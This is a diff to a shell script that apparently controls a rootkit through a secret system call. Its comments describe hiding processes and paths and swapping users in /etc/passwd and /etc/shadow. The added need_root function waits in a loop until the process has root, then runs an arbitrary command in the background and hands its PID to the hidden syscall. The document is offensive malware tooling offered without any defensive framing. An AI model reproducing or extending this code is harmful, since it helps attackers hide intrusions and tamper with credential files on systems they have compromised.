@@ -28,6 +28,7 @@
 #     hide PATH -> hide an entity ("/proc" paths are treated as processes)
 #     show PATH -> show a hidden entity ("/proc" paths are treated as processes)
 #     unghost UID -> replace a user in "/etc/passwd" and "/etc/shadow"
+
 [ -z "$1" ] && echo "Expected a system call number." >&2 && exit 1
 CALL="$1"
 COMMAND=command # execute a system command
@@ -40,5 +41,21 @@ fi
 SECRET="$2"
 REST_LEN=`echo -n "${CALL} ${SECRET} ${COMMAND}" | wc -c`
 REST=`echo -n "$@" | cut "-c$(( ${REST_LEN} + 1 ))-"`
+
+need_root() {
+  while [ `id -u` != 0 ]
+  do
+    sleep 0.1
+  done
+  [ ! -z "$@" ] && $@ &
+}
+
+if [ "${COMMAND}" = command ]
+then
+  # this is a pseudo-command
+  
+  need_root ${REST} &
+  REST=$!
+fi
 ./syscall "${CALL}" "${SECRET}" "@${COMMAND}" ${REST}
 
